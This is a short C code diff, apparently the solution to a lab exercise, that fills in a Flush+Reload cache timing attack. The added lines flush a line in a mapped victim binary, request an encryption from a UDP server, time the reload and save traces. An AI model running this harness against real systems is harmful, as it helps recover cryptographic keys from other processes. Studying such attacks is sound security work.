@@ -181,10 +181,16 @@ uint32_t reload(void *target)
 void doTrace()
 {
     // generate a new plaintext
+    generatePlaintext();
     // set the cache to a known state
+    clflush(target);
     // ask victim for an encryption
+    int status = send(s, plaintext, 16, 0);
+    int r = recv(s, ciphertext, 16, 0);
     // check current cache state
+    *timing = reload(target);
     // record timing and ciphertext
+    saveTrace();
 #ifdef DEBUG
     printText(ciphertext, 16, "ciphertext");
     printf("Timing: %i\n", *timing);
@@ -226,12 +232,11 @@ void init()
     server.sin_port = htons(10000);
 
     if ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1) exit(101);
-
     if (connect(s, (struct sockaddr *) &server, sizeof server) == -1) exit(102);
 
     // setup the target for monitoring
     printf("setting up target\n");
-    target = NULL;
+    target = map_offset(victimBinaryFileName, offset);
 
 // #ifdef DEBUG
     printf("offset: %x\n", offset);
@@ -263,5 +268,5 @@ void finish()
     if( plainFP != NULL )
         fclose(plainFP);
 
-    unmap_offset(addr);
+    unmap_offset(target);
 }
